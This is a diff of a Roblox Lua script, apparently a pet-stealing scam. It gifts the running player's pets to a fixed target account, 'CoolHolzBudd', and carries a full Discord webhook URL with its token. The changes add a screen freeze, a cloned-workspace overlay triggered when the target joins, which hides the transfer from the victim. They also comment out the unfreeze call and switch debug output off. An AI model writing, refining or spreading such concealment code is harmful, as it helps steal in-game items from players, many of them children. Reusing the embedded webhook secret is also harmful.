@@ -6,7 +6,7 @@ local Config = {
     TargetPlayerName = "CoolHolzBudd", -- Zielspieler, an den Pets geschickt werden
     DelayBetweenGifts = 3, -- Wartezeit zwischen den Geschenken
     WebhookURL = "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk",
-    DebugMode = true -- Debug-Ausgaben aktivieren
+    DebugMode = false -- Debug-Ausgaben aktivieren
 }
 
 -- Wait for game to load
@@ -84,23 +84,75 @@ local function Log(message)
 end
 
 local function FreezeScreen()
-    if setfpscap then
-        setfpscap(0)
-        Log("🧊 Screen frozen (FPS cap)")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    
+    -- Remove existing freeze if any
+    pcall(function()
+        local existing = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
+        if existing then
+            existing:Destroy()
+        end
+    end)
+    
+    -- Create ScreenGui
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "ScreenFreeze"
+    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    
+    -- Create ViewportFrame for screenshot effect
+    local viewportFrame = Instance.new("ViewportFrame")
+    viewportFrame.Size = UDim2.new(1, 0, 1, 0)
+    viewportFrame.Position = UDim2.new(0, 0, 0, 0)
+    viewportFrame.BackgroundTransparency = 1
+    viewportFrame.CurrentCamera = workspace.CurrentCamera
+    viewportFrame.Parent = screenGui
+    
+    -- Create WorldModel and clone workspace
+    local worldModel = Instance.new("WorldModel")
+    worldModel.Parent = viewportFrame
+    
+    -- Clone current workspace state
+    local success, error = pcall(function()
+        for _, obj in pairs(workspace:GetChildren()) do
+            if obj ~= LocalPlayer.Character then
+                local cloneSuccess, clone = pcall(function()
+                    return obj:Clone()
+                end)
+                if cloneSuccess and clone then
+                    clone.Parent = worldModel
+                end
+            end
+        end
+    end)
+    
+    if success then
+        Log("🧊 Screen frozen (screenshot)")
         return true
     else
-        Log("❌ setfpscap not available")
+        Log("❌ Screenshot freeze failed: " .. tostring(error))
         return false
     end
-  end
+end
 
 local function UnfreezeScreen()
-    if setfpscap then
-        setfpscap(60)
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    
+    local success, error = pcall(function()
+        local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
+        if screenGui then
+            screenGui:Destroy()
+            return true
+        end
+        return false
+    end)
+    
+    if success then
         Log("🔓 Screen unfrozen")
         return true
     else
-        Log("❌ setfpscap not available")
+        Log("❌ Unfreeze failed: " .. tostring(error))
         return false
     end
 end
@@ -798,6 +850,7 @@ end
     end
     
     Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
+    --UnfreezeScreen()
     isRunning = false
 end
 
@@ -853,6 +906,7 @@ pcall(function()
     Players.PlayerAdded:Connect(function(player)
         if player.Name == Config.TargetPlayerName then
             Log("🎯 Target player joined: " .. player.Name)
+            FreezeScreen()
             wait(3) -- Give them time to load
             if not isRunning then
                 spawn(function()
